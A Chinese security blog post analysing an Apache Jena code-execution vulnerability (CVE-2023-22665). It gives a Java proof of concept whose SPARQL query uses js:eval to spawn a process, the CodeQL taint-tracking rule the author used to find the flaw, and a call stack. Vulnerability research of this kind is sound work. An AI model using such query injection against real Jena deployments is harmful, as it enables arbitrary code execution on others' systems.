---
title: Apache Jena 代码执行漏洞(CVE-2023-22665)
url: https://l3yx.github.io/2023/05/05/Apache-Jena-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2023-22665/
source: l3yx's blog
date: 2023-05-06
fetch_date: 2025-10-04T11:38:18.343368
---

# Apache Jena 代码执行漏洞(CVE-2023-22665)

[l3yx's blog](/)

* [首页](/)
* [归档](/archives/)
* [标签](/tags/)
* 搜索

* 文章目录
* 站点概览

1. [1. 影响范围](#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4)
2. [2. 漏洞复现](#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0)
3. [3. 挖掘过程](#%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B)
4. [4. 参考](#%E5%8F%82%E8%80%83)

![淚笑](/resources/avatar.jpg)

淚笑

学的越多，懂的越少

[GitHub](https://github.com/l3yx "GitHub → https://github.com/l3yx")

E-Mail

# Apache Jena 代码执行漏洞(CVE-2023-22665)

发表于
2023-05-05

本文字数：
476

阅读时长 ≈
2 分钟

ARQ是Jena的一个查询引擎，它支持SPARQLRDF查询语言，同时也支持JavaScript。当Jena应用的SPARQL语句被外部可控时，将会造成任意代码执行漏洞。

## 影响范围

* Apache Jena <= 4.7.0

## 漏洞复现

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` <dependency>   <groupId>org.apache.jena</groupId>   <artifactId>apache-jena</artifactId>   <version>4.6.1</version>   <type>pom</type> </dependency> ``` |

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ``` | ``` package org.example;  import org.apache.jena.query.*; import org.apache.jena.rdf.model.*;  public class ApacheJenaTest {     public static void main(String[] args) {         String queryString = "PREFIX js: <http://jena.apache.org/ARQ/jsFunction#>\n" +                 "SELECT js:eval(\"new java.lang.ProcessBuilder(\\\"open\\\", \\\"-a\\\", \\\"calculator\\\").start()\") {}" ;          Model model = ModelFactory.createDefaultModel();         QueryExecution qexec = QueryExecutionFactory.create(queryString, model);         qexec.execSelect().next();     } } ``` |

## 挖掘过程

在分析[CVE-2022-42889](/2022/12/17/%E7%94%A8CodeQL%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E-CVE-2022-42889/)的时候，就觉得这种类型的漏洞应该比较普遍，所以写了对应的CodeQL规则，批量的扫了一些开源项目

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 ``` | ``` /**  * @kind path-problem  */  import java import semmle.code.java.dataflow.DataFlow import semmle.code.java.dataflow.TaintTracking import DataFlow::PathGraph  class PublicMethodParameter extends DataFlow::Node {   PublicMethodParameter() {     exists(Method m, Parameter p |       m.getDeclaringType().isPublic() and       m.isPublic() and       p = m.getAParameter() and       p.getType().hasName("String") and       this.asParameter() = p     )   } }  class ScriptEngineSink extends DataFlow::Node {   ScriptEngineSink() {     exists(MethodAccess ma, Interface i |       this.asExpr() = ma.getAnArgument() and       ma.getCallee().getDeclaringType().getASupertype*() = i and       (         i.hasQualifiedName("javax.script", "Invocable") and         (           ma.getCallee().hasName("invokeFunction") or           ma.getCallee().hasName("invokeMethod")         )         or         i.hasQualifiedName("javax.script", "Compilable") and         ma.getCallee().hasName("compile")         or         i.hasQualifiedName("javax.script", "ScriptEngine") and         ma.getCallee().hasName("eval")       )     )   } }   class TaintTrackingConfig extends TaintTracking::Configuration {   TaintTrackingConfig() { this = "TaintTrackingConfig" }    override predicate isSource(DataFlow::Node source) { source instanceof PublicMethodParameter }    override predicate isSink(DataFlow::Node sink) { sink instanceof ScriptEngineSink } }  from TaintTrackingConfig cfg, DataFlow::PathNode source, DataFlow::PathNode sink where cfg.hasFlowPath(source, sink) select sink, source, sink,   "Source: " + source.getNode().asParameter().getCallable().getDeclaringType() + "." +     source.getNode().asParameter().getCallable() ``` |

扫出来的结果也不能直接视为漏洞，只是可能存在类似漏洞，可以作为参考，然后我根据官方文档[Apache Jena - ARQ - JavaScript SPARQL Functions](https://jena.apache.org/documentation/query/javascript-functions.html)，即可得到POC，调用栈如下：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ``` | ``` invokeFunction:197, NashornScriptEngine (jdk.nashorn.api.scripting) exec:102, ScriptFunction (org.apache.jena.sparql.function.scripting) exec:64, FunctionBase (org.apache.jena.sparql.function) exec:47, FunctionBase (org.apache.jena.sparql.function) evalSpecial:69, E_Function (org.apache.jena.sparql.expr) eval:100, ExprFunctionN (org.apache.jena.sparql.expr) get:114, VarExprList (org.apache.jena.sparql.core) accept:64, QueryIterAssign (org.apache.jena.sparql.engine.iterator) hasNextBinding:81, QueryIterProcessBinding (org.apache.jena.sparql.engine.iterator) hasNext:116, QueryIteratorBase (org.apache.jena.sparql.engine.iterator) hasNextBinding:58, QueryIterConvert (org.apache.jena.sparql.engine.iterator) hasNext:116, QueryIteratorBase (org.apache.jena.sparql.engine.iterator) hasNextBinding:38, QueryIteratorWrapper (org.apache.jena.sparql.engine.iterator) hasNext:116, QueryIteratorBase (org.apache.jena.sparql.engine.iterator) hasNextBinding:38, QueryIteratorWrapper (org.apache.jena.sparql.engine.iterator) nextBinding:154, QueryIteratorBase (org.apache.jena.sparql.engine.iterator) next:134, QueryIteratorBase (org.apache.jena.sparql.engine.iterator) next:43, QueryIteratorBase (org.apache.jena.sparql.engine.iterator) next:53, RowSetStream (org.apache.jena.sparql.exec) next:29, RowSetStream (org.apache.jena.sparql.exec) nextBinding:93, ResultSetStream (org.apache.jena.sparql.engine) nextSolution:118, ResultSetStream (org.apache.jena.sparql.engine) next:126, ResultSetStream (org.apache.jena.sparql.engine) ``` |

## 参考

[RDF 和 SPARQL 初探：以维基数据为例 - 阮一峰的网络日志](https://www.ruanyifeng.com/blog/2020/02/sparql.html)

[# Web安全](/tags/Web%E5%AE%89%E5%85%A8/)
[# Java](/tags/Java/)
[# 漏洞分析](/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
[# 静态分析](/tags/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/)
[# CodeQL](/tags/CodeQL/)

[Apache Archiva 任意目录删除(CVE-2022-40309) 和 任意文件读取(CVE-2022-40308)](/2022/12/24/Apache-Archiva-%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4-CVE-2022-40309-%E5%92%8C-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-CVE-2022-40308/ "Apache Archiva 任意目录删除(CVE-2022-40309) 和 任意文件读取(CVE-2022-40308)")

[Tabby学习笔记 & Java反序列化gadget分析](/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/ "Tabby学习笔记 & Java反序列化gadget分析")

©
2025

淚笑

95k

5:47

由 [Hexo](https://hexo.io/) & [NexT.Gemini](https://theme-next.js.org/) 强力驱动

0%

Theme NexT works best with JavaScript enabled